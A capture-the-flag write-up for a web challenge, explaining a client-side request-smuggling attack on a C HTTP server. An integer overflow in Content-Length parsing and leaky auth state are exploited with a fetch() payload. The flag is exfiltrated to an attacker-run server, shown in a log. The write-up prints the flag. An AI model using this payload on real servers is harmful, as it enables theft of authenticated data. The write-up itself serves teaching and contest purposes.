# Now You C Me

**Author**: zeyu2001

**Category**: Web

Flag: `SEE{d0_y0u_SEE_n0w_288df01d75e410233426eb0c74897b9f}`

## Description

Can you C the flag though?

Note:

- The HTTP server is not publicly exposed, but you can test locally. Submit your URL for the admin bot to visit.
- Use the `http://chall` URL as the target page.

## Difficulty

Medium

## Solution

This challenge is inspired by [client-side desync research](https://i.blackhat.com/USA-22/Wednesday/us-22-Kettle-Browser-Powered-Desync-Attacks-wp.pdf) by James Kettle. While this research focused on scenarios involving more than one request-response sequence (one to poison the connection stream, one legitimate), this challenge is meant to be solved with only one request-response sequence.

In this challenge, the unauthenticated `/` URL is publicly readable due to CORS being enabled. This is intended as these public pages should pose no security risk.

```c
// Non authenticated endpoints
#define PUBLIC_RESPONSE_HEADERS printf("Access-Control-Allow-Headers: Authorization\n" \
                                       "Access-Control-Allow-Methods: GET, POST, OPTIONS\n" \
                                       "Access-Control-Allow-Credentials: %s\n" \
                                       "Access-Control-Allow-Origin: %s\n" \
                                       "Content-Type: text/html; charset=UTF-8\n\n", \
                                       request_header("Origin") ? "true" : "false", \
                                       request_header("Origin") ? request_header("Origin") : "*")
```

The authenticated `/api/flag` API endpoint, however, is not CORS-enabled. Therefore, by the Same Origin Policy, the browser will not allow arbitrary pages to access the flag.

If we exploit the desync vulnerability, we can **make a request to the CORS-enabled `/` URL** that will be **split into two seperate requests** by the server. The first request will be the legitimate request to `/`, and the second request will be the malicious request to `/api/flag`. The server then answers both requests. Because the browser treats this as a single response (for the `/` URL), we can read both responses thanks to the first response's CORS headers.

The vulnerability here is simple enough to spot - the `Content-Length` is processed using `atoi` and a sufficiently large `Content-Length` causes an overflow in the `payload_size`.

```c
short payload_size;

...

payload_size = t2 ? atoi(t2) : 0;
```

The interesting part is crafting the exploit. Client-side desync attacks are powerful because they can be constructed from perfectly valid requests through the `fetch` API.

For instance,

```javascript
fetch("http://app/api/", {method: "POST", credentials: "include", body: "xx\r\nPOST /api/flag HTTP/1.1\r\nHost: x.com\r\nOrigin: http://x.com\r\n\r\n" + "a".repeat(65540 - 66) }).then(r => r.text()).then(data => console.log(data))
```

sends

```http
POST /api/ HTTP/1.1
Host: app
Content-Length: 65540
Pragma: no-cache
Cache-Control: no-cache
Authorization: Basic YWRtaW46am95b3VzLXVubGluZWQtdW5zb2NpYWw=

...

Connection: close

xx
POST /api/flag HTTP/1.1
Host: x.com
Origin: http://x.com

aaa ... (until 65540 `Content-Length`)
```

which is processed by the server as two requests: the first one having a content length of 4 (due to the overflow) and the second one being a POST request to `/api/flag`.

The second bug is in the setting of `is_admin` - as long as the first request has a valid `Authorization` header, any subsequent requests in the same TCP stream will be treated as authenticated.

```c
if (request_header("Authorization") != NULL && strstr(request_header("Authorization"), getenv("SECRET")) != NULL) {
    is_admin = true;
}
```

After making the above request, the flag would be found in the response and can be read by our JavaScript.

```http
HTTP/1.1 500 Internal Server Error
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: http://www.example.com
Content-Type: text/html; charset=UTF-8


HTTP/1.1 200 OK
Content-Type: application/json; charset=UTF-8

{"flag": "SEE{d0_y0u_SEE_n0w_288df01d75e410233426eb0c74897b9f}"}
```

The solution script is available [here](./solve/exploit.html).

```
$ python3 -m http.server 1337
Serving HTTP on :: port 1337 (http://[::]:1337/) ...
::1 - - [30/Dec/2022 02:16:25] "GET /exploit.html HTTP/1.1" 200 -
::1 - - [30/Dec/2022 02:16:26] "GET /?data=SFRUUC8xLjEgMjAwIE9LCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbjsgY2hhcnNldD1VVEYtOAoKeyJmbGFnIjogIlNFRXtkMF95MHVfU0VFX24wd18yODhkZjAxZDc1ZTQxMDIzMzQyNmViMGM3NDg5N2I5Zn0ifQ== HTTP/1.1" 200 -
```

## Sidenote

Because Chrome pools its connection sockets for potential reuse, the admin bot starts a new Chrome instance for each request. This prevents players from interfering with each others' attacks.
